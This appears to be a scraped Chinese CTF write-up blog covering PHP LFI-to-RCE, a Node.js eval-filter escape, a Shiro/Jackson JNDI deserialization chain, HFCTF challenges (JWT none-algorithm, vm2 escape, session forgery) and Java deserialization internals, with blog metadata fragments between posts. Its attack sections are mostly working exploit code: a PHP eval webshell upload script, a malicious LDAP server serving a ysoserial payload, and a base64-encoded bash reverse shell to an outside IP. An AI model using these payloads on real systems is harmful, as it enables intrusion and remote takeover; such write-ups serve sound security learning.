得到下一关地址flflflflag.php 1include($_GET[\"file\"]) 因为前面目录扫到dir.php，可以联想到LFI2RCE中的php7+LFI+segment fault 以前整理的脚本 12345678910111213141516171819import requestsfrom io import BytesIOimport refiles = &#123; 'file': BytesIO('&lt;?php eval($_REQUEST[sky]);')&#125;url = 'http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'try: r = requests.post(url=url, files=files, allow_redirects=False)except: url = 'http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/dir.php' r = requests.get(url) data = re.search(r\"php[a-zA-Z0-9]&#123;1,&#125;\", r.content).group(0) url = \"http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/flflflflag.php?file=/tmp/\"+data data = &#123; 'sky':\"phpinfo();\" &#125; r = requests.post(url=url,data=data) print r.content 还需要绕下disable_func 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir ld_preload，利用error_log()触发 验证🐎 参考过客师傅： https://guokeya.github.io/post/XxOKeal9U/ nodejs 源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980const express = require('express');const bodyParser = require('body-parser');const cookieSession = require('cookie-session');const fs = require('fs');const crypto = require('crypto');const keys = require('./key.js').keys;function md5(s) &#123; return crypto.createHash('md5') .update(s) .digest('hex');&#125;// 正则匹配限制了表达式形式function saferEval(str) &#123; if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) &#123; return null; &#125; return eval(str);&#125; // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync('./index.html').toString();function render(results) &#123; return template.replace('&#123;&#123;results&#125;&#125;', results.join('&lt;br/&gt;'));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123; name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧ keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post('/', function (req, res) &#123; let result = ''; const results = req.session.results || []; const &#123; e, first, second &#125; = req.body; if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123; if (req.body.e) &#123; try &#123; result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!'; &#125; catch (e) &#123; console.log(e); result = 'Wrong Wrong Wrong!!!'; &#125; results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); &#125; &#125; else &#123; results.unshift('Not verified!'); &#125; if (results.length &gt; 13) &#123; results.pop(); &#125; req.session.results = results; res.send(render(req.session.results));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get('/source', function (req, res) &#123; res.set('Content-Type', 'text/javascript;charset=utf-8'); res.send(fs.readFileSync('./index.js'));&#125;);app.get('/', function (req, res) &#123; res.set('Content-Type', 'text/html;charset=utf-8'); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, '0.0.0.0', () =&gt; &#123; console.log('Start listening')&#125;); 第一层绕过 1first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0]) 利用js弱类型，传first=1&amp;second=[1] [1].length和&quot;1&quot;.length都是1 md5([1]+key[0])，这里+的时候[1]会转换为&quot;1&quot; 第二层 12result = saferEval(req.body.e)results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); 1str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '') 12用圆括号将所有选择项括起来，相邻的选择项之间用|分隔。但用圆括号会有一个副作用，使相关的匹配会被缓存，此时可用?:放在第一个选项前来消除这种副作用。其中 ?: 是非捕获元之一，还有两个非捕获元是 ?&#x3D; 和 ?!，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。 上面的正则可以选择三种形式： 括号内表示0或1次 1、Math(.aaaa)形式 2、[()+\\-*/&amp;|^%&lt;&gt;=,?:]里面的字符会被匹配上 3、111(.)111(e111)的形式会被匹配上 我理解是因为用了?:导致整个匹配出现问题 payload如下 1(Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.x&#x3D;Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()))(Math+1) (Math=&gt;(xxxxx)())(Math+1)表示匿名函数， 定义一个function，传入参数名为Math，之后执行xxxxx，传入的参数值为Math+1 Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))() 原型链污染，先将Math赋值为Math.constructor即Object，然后设置Object的construct()方法为 return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;) 但是这里由于限制了字符，需要调用fromCharCode()，而该方法只能由string调用，因此前面传入Math+1，+表示字符串拼接会转化成为string类型，string.constructor为funcion 最后通过eval()执行 payload 1&#123;&quot;e&quot;:&quot;(Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.x&#x3D;Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]&#125; 迷的还是这个正则。。 ezShirohint：gadget在POM.xml内，jdk&gt;8u191，json反序列化 gadget应该是commons-collections3.2.1，根据jdk&gt;8u191限制，应该是可以使用CC5 json反序列化应该是fastjson或者jsckson的反序列化漏洞， 12345678&#123; \"@type\" : \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\", \"driverClassLoader\" : &#123; \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\" &#125;, \"driverClassName\" : \"$$BCEL$$+CC5\"&#125; 将CC5的恶意对象进行 BCEL编码 12345Path path = Paths.get(\"poc.txt\");byte[] data = Files.readAllBytes(path);//BCEL编码String s = Utility.encode(data,true);System.out.print(s); 打了一发没成功 =========================重新做一下 参考链接： moon师傅 访问/json会跳到/login shiro漏洞CVE-2020-1957 使用/;/json Shiro 权限绕过漏洞分析（CVE-2020-1957） 设置了POST请求方式，post传a=1，提示was expecting(&#39;true&#39;,&#39;false&#39; or null) post传true，得到jackson interface 查看pom.xml 比较明显的有ch.qos.logback和common-collections 这里jackson的可以利用CVE-2019-14439 Jackson各个gadget的调用链 JNDI Injection using Getter Based Deserialization Gadgets 1[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap:&#x2F;&#x2F;localhost:43658&#x2F;Calc&quot;&#125;] JNDI注入，开启一个ldap服务绑定恶意类 使用marshalsec方便的启动一个LDAP/RMI Ref Server 1mvn clean package -DskipTests 不知道题目环境后端是怎么解析json的，自己本地搭建测试使用 12345&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.8.3&lt;/version&gt;&lt;/dependency&gt; 测试类Test.java 1234567891011121314151617181920212223import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Test &#123; public static void main(String[] args) throws IOException &#123; StringBuilder d = new StringBuilder(); d.append(\"[\"); d.append(\"\\\"ch.qos.logback.core.db.JNDIConnectionSource\\\"\"); d.append(\",\"); d.append(\"&#123;\"); d.append(\"\\\"jndiLocation\\\"\"); d.append(\":\"); d.append(\"\\\"ldap://0.0.0.0:1389/EvilObject\\\"\"); // payload d.append(\"&#125;\"); d.append(\"]\"); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); Object obj = objectMapper.readValue(d.toString(), java.lang.Object.class); objectMapper.writeValueAsString(obj); &#125;&#125; 恶意类EvilObject.java 1234567import java.io.IOException;public class EvilObject &#123; public EvilObject() throws IOException &#123; Runtime.getRuntime().exec(\"calc\"); &#125;&#125; 先编译成EvilObject.class，再开个http服务 1F:\\IdeaProjects\\ctf-shiro\\target\\classes&gt;python -m SimpleHTTPServer 1233 启动LDAP服务 1java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;0.0.0.0:1233&#x2F;#EvilObject 在buu上做开个frps，本地配置 1234567891011[common]# server_addr 为 FRP 服务端的公网 IPserver_addr &#x3D; node3.buuoj.cn# server_port 为 FRP 服务端监听的端口server_port &#x3D; 26678[windows]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 1389remote_port &#x3D; 1234 payload打一下 1[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap:&#x2F;&#x2F;0.0.0.0:1234&#x2F;EvilObject&quot;&#125;] 没有反应，因为高版本JVM对Reference Factory远程加载类进行了安全限制，JVM不会信任LDAP对象反序列化过程中加载的远程类。此时，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。 上面本地测试的java版本是java1.8.0，切换成8u202，还是能执行，不继续测试了。 尝试本地Gadget，一开始自己分析用CC5，wp使用的是CC8， marshalsec无法利用序列化内容开启服务。 参考kxcode 本地开启一个ldap服务，先试试CC5，使用ysoserial生成序列化数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110package HackerServer.src.main.java;import java.net.*;import java.text.ParseException;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import HackerServer.src.main.java.CodebaseServer;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import com.unboundid.util.Base64;public class HackerLDAPRefServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void lanuchLDAPServer(Integer ldap_port, String http_server, Integer http_port) throws Exception &#123; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), ldap_port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(\"http://\"+http_server+\":\"+http_port+\"/#Exploit\"))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + ldap_port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"foo\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; /** Payload1: Return Reference Factory **/ // e.addAttribute(\"javaCodeBase\", cbstring); // e.addAttribute(\"objectClass\", \"javaNamingReference\"); // e.addAttribute(\"javaFactory\", this.codebase.getRef()); /** Payload1 end **/ /** Payload2: Return Serialized Gadget **/ try &#123; // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64 e.addAttribute(\"javaSerializedData\",Base64.decode(\"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIACEIABmZvcm1hdEkACmxpbmVOdW1iZXJMAA9jbGFzc0xvYWRlck5hbWVxAH4ABUwADmRlY2xhcmluZ0NsYXNzcQB+AAVMAAhmaWxlTmFtZXEAfgAFTAAKbWV0aG9kTmFtZXEAfgAFTAAKbW9kdWxlTmFtZXEAfgAFTAANbW9kdWxlVmVyc2lvbnEAfgAFeHABAAAAUXQAA2FwcHQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0cHBzcQB+AAsBAAAAM3EAfgANcQB+AA5xAH4AD3EAfgAQcHBzcQB+AAsBAAAAInEAfgANdAAZeXNvc2VyaWFsLkdlbmVyYXRlUGF5bG9hZHQAFEdlbmVyYXRlUGF5bG9hZC5qYXZhdAAEbWFpbnBwc3IAH2phdmEudXRpbC5Db2xsZWN0aW9ucyRFbXB0eUxpc3R6uBe0PKee3gIAAHhweHNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXlxAH4AAUwAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AAXhwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXEAfgAFWwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAvAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AL3NxAH4AKHVxAH4ALAAAAAJwdXEAfgAsAAAAAHQABmludm9rZXVxAH4ALwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ACxzcQB+ACh1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdAAEY2FsY3QABGV4ZWN1cQB+AC8AAAABcQB+ADRzcQB+ACRzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg=\")); &#125; catch (ParseException e1) &#123; e1.printStackTrace(); &#125; /** Payload2 end **/ result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125; public static void main(String[] args) throws Exception &#123; System.out.println(\"HttpServerAddress: \"+\"127.0.0.1\"); System.out.println(\"HttpServerPort: \"+\"1234\"); System.out.println(\"LDAPServerPort: \"+\"1233\"); String http_server_ip = \"127.0.0.1\"; int ldap_port = Integer.valueOf(\"1234\"); int http_server_port = Integer.valueOf(\"1233\"); CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port); lanuchLDAPServer(ldap_port, http_server_ip, http_server_port); &#125;&#125; 成功，但是这里需要反弹shell 使用ysoserial生成payload，使用bash -i &gt;&amp; /dev/tcp/174.0.194.66/1234 0&gt;&amp;1会失败， 因为Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要进行一次编码 1bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzQuMC4xOTQuNjYvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 1java -jar ysoserial.jar CommonsCollections5 &#39;curl 174.0.194.66&#39;|base64|xargs echo -nTIzNC5 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzQuMC4xOTQuNjYvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;|base64|xargs echo -n 反弹shell成功。也可以试试wp的CC8那条链","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"HFCTF-wp","slug":"HFCTF-wp","date":"2020-04-19T11:21:38.000Z","updated":"2020-04-21T01:55:23.968Z","comments":true,"path":"2020/04/19/HFCTF-wp/","link":"","permalink":"https://glotozz.github.io/2020/04/19/HFCTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 EasyLogin JustEscape BabyUpload EasyLogin根据提示 1234&#x2F;** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD *&#x2F; 存在任意文件读取，读到/app.js、/rest.js、/controller.js、/controllers/api.js 这里的sid是用户可修改的，而user经过会jwt验证，，而当用户传入jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 本来可以传一个不存在的数组下标，但是这里最后一个条件限制了sid&gt;length &amp;&amp; sid&gt;=0，只能利用弱类型绕过，这里[]或者&quot;&quot; 1234# pip3.6 install pyjwtimport jwttoken = jwt.encode(&#123;\"secretid\":&#123;&#125;,\"username\":\"admin\",\"password\":\"admin\"&#125;,algorithm=\"none\",key=\"\").decode(encoding='utf-8')print(token) 登录得到flag JustEscape后端报错，发现是nodejs的vm， 逃逸：https://github.com/patriksimek/vm2/issues/225 123456789try&#123; Buffer.from(new Proxy(&#123;&#125;, &#123; getOwnPropertyDescriptor()&#123; throw f&#x3D;&gt;f.constructor(&quot;return process&quot;)(); &#125; &#125;)); &#125;catch(e)&#123; e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125; 用数组绕过过滤code[]= 还可以利用js中[]代替. 比如a.b==a[b] 反引号代替双引号等， 赵总利用模板字符串嵌套 1&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96; BabyUpload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384 &lt;?phperror_reporting(0);session_save_path(\"/var/babyctf/\");session_start();require_once \"/flag\";highlight_file(__FILE__);//需要把SESSION中的username置为admin才能得到flagif($_SESSION['username'] ==='admin')&#123; $filename='/var/babyctf/success.txt'; if(file_exists($filename))&#123; safe_delete($filename); die($flag); &#125;&#125;else&#123; $_SESSION['username'] ='guest';&#125;//POST赋值$direction = filter_input(INPUT_POST, 'direction');$attr = filter_input(INPUT_POST, 'attr');//上传目录拼接一层attr$dir_path = \"/var/babyctf/\".$attr;//上传路径拼接上session中的usernameif($attr===\"private\")&#123; $dir_path .= \"/\".$_SESSION['username'];&#125;//上传文件if($direction === \"upload\")&#123; try&#123; //is_uploaded_file() 函数检查指定的文件是否是通过 HTTP POST 上传 if(!is_uploaded_file($_FILES['up_file']['tmp_name']))&#123; throw new RuntimeException('invalid upload'); &#125; //dir_path拼接上文件名 $file_path = $dir_path.\"/\".$_FILES['up_file']['name']; //文件名继续拼接上一段hash值 $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']); //对上传路径进行正则匹配过滤../和..\\\\ if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path))&#123; throw new RuntimeException('invalid file path'); &#125; //dir_path创建目录，将临时文件移动到该目录下 @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path))&#123; $upload_result = \"uploaded\"; &#125;else&#123; throw new RuntimeException('error while saving'); &#125; &#125; catch (RuntimeException $e) &#123; $upload_result = $e-&gt;getMessage(); &#125;//下载文件&#125; elseif ($direction === \"download\") &#123; try&#123; //返回路径中的文件名部分 $filename = basename(filter_input(INPUT_POST, 'filename')); //file_path拼接上文件名 $file_path = $dir_path.\"/\".$filename; //对下载路径进行正则匹配过滤../和..\\\\ if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path))&#123; throw new RuntimeException('invalid file path'); &#125; //判断文件是否存在 if(!file_exists($file_path)) &#123; throw new RuntimeException('file not exist'); &#125; //设置返回头，这个substr($filename, 0, -65)挺奇怪的，如果filename的长度小于65会返回false，返回的filename=\"\" header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"'); //读取文件 if(readfile($file_path))&#123; $download_result = \"downloaded\"; &#125;else&#123; throw new RuntimeException('error while saving'); &#125; &#125; catch (RuntimeException $e) &#123; $download_result = $e-&gt;getMessage(); &#125; exit;&#125;?&gt; 看完源码后思路 一、上传session格式的文件，修改Cookie中的PHPSESSID从而伪造身份，文件内容，默认的session处理器得到的内容为username|s:5:&quot;admin&quot;;。主要利用的是相同的文件内容对应的文件名相同。 二、成功伪造admin后，还需要创建一个/var/babyctf/success.txt，可以通过POST传attr为success.txt创建目录绕过file_exist() 然后有个小坑，读取下session文件，发现格式不太一样。。强行用一下download功能。。 需要最前面加个%08字符，以及没有|，其实就是将session处理器设置为 php_binary","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"java反序列化原理","slug":"java反序列化原理","date":"2020-04-18T01:40:04.000Z","updated":"2020-04-20T02:58:57.124Z","comments":true,"path":"2020/04/18/java反序列化原理/","link":"","permalink":"https://glotozz.github.io/2020/04/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 为什么要序列化数据 序列化过程 反序列化过程 反序列化漏洞修复 反序列化漏洞触发场景 反序列化漏洞挖掘 参考链接 java体系很大，自己刚入门，分析一些历史漏洞的时候发现很多知识点联系不到一起，因此参考一些文章和自己的理解写一篇简单的总结。 为什么要序列化数据JSON和XML是通用数据交互格式，通常用于不同语言、不同环境下数据的交互，比如前端的JavaScript通过JSON和后端服务通信、微信服务器通过XML和公众号服务器通信。但是这两种语言无法直接传输对象，比如，Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输。 序列化过程Test1.java 123456789101112131415161718192021222324252627282930313233343536import java.io.*;public class Test1 implements Serializable &#123; private static final long serialVersionUID = 5754104541168322017L; private int id; public String name; public Test1(int id,String name)&#123; this.id=id; this.name=name; &#125;// private void writeObject(java.io.ObjectOutputStream s) throws IOException &#123;// s.defaultWriteObject();// s.writeObject(\"This is a object\");// &#125;// private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException &#123;// in.defaultReadObject();// Runtime.getRuntime().exec(\"calc\");// &#125; public static void main(String[] args) throws Exception&#123; Test1 test1 = new Test1(1,\"gqy\"); //序列化 File f = new File(\"test1.ser\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(test1); out.close(); //反序列化 FileInputStream fis = new FileInputStream(\"test1.ser\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); &#125;&#125; 16进制查看 SerializationDumper查看序列化数据 可以看到ClassName、Fields、classdata还是很清楚的，另外的一些可以看官方文档 Java在序列化时一个对象，将会调用这个对象中的 writeObject() 方法，参数类型是ObjectOutputStream ，开发者可以将任何内容写入这个stream中。 如果上面Test1.java重写writeObject()（参考Test1.java中的注释），序列化的数据是这样的，发现多了objectAnnotation 反序列化过程反序列化时，会调用readObject() ，开发者也可以从中读取出前面写入的内容，并进行处理。 在命令执行处打个断点 根据调用栈可以清楚的下断点（一开始用的java1.8环境，建议换用java1.7，代码可读性更高） 跟进readObject0() 这里读取的tc其实就是序列化数据中的TC_OBJECT 跟进readOrdinaryObject() 12345678910111213141516171819202122232425262728293031private Object readOrdinaryObject(boolean unshared) throws IOException &#123; if (bin.readByte() != TC_OBJECT) &#123; throw new InternalError(); &#125; // 读取序列化中的ObjectStreamClass ObjectStreamClass desc = readClassDesc(false); ... // 通过反射，创建对象 Object obj; try &#123; obj = desc.isInstantiable() ? desc.newInstance() : null; &#125; catch (Exception ex) &#123; ... &#125; // 判断是否实现了Externalizable接口，如果实现了接口，使用这个接口来给属性赋值 if (desc.isExternalizable()) &#123; readExternalData((Externalizable) obj, desc); &#125; // 我们并没有实现Externalizable接口，会进入到else判断 else &#123; // 读取序列化的数据 readSerialData(obj, desc); &#125; // 判断是否自定义了readObject方法，如果有会调用，如果没有直接返回obj // 此处省略 ... return obj; &#125; 上面方法是反序列化的全部流程，重点看一下读取ObjectStreamClass的readClassDesc()方法和读取序列化数据的readSerialData()方法。 跟进readClassDesc() 这里对应的是TC_CLASSDESC中的内容 注意到case还有个 TC_PROXYCLASSDESC是 代理类描述符，与反序列化漏洞修复相关，之后介绍。 先跟进readNonProxyDesc() 1234567891011121314151617181920212223242526private ObjectStreamClass readNonProxyDesc(boolean unshared) throws IOException &#123; ... // 创建ObjectStreamClass ObjectStreamClass desc = new ObjectStreamClass(); // 读取ObjectStreamClass ObjectStreamClass readDesc = null; try &#123; readDesc = readClassDescriptor(); &#125; catch (ClassNotFoundException ex) &#123; throw (IOException) new InvalidClassException( \"failed to read class descriptor\").initCause(ex); &#125; ... // 通过调用resolveClass()获取类名，跟进是通过Class.forName(name, false, latestUserDefinedLoader())反射获取类名 try &#123; if ((cl = resolveClass(readDesc)) == null) &#123; resolveEx = new ClassNotFoundException(\"null class\"); ... // 通过读取到ObjectStreamClass初始化desc desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false)); ... // 返回desc return desc; &#125; 跟进readClassDescriptor()=&gt;readNonProxy()，初始化属性 跟进initNonProxy()，主要是一些判断，比如serialVersionUID是否相等，否则抛出异常 前面已经初始化了属性，跟进readSerialData()，会读取并将属性赋值 反序列化漏洞修复前面提到TC_PROXYCLASSDESC是 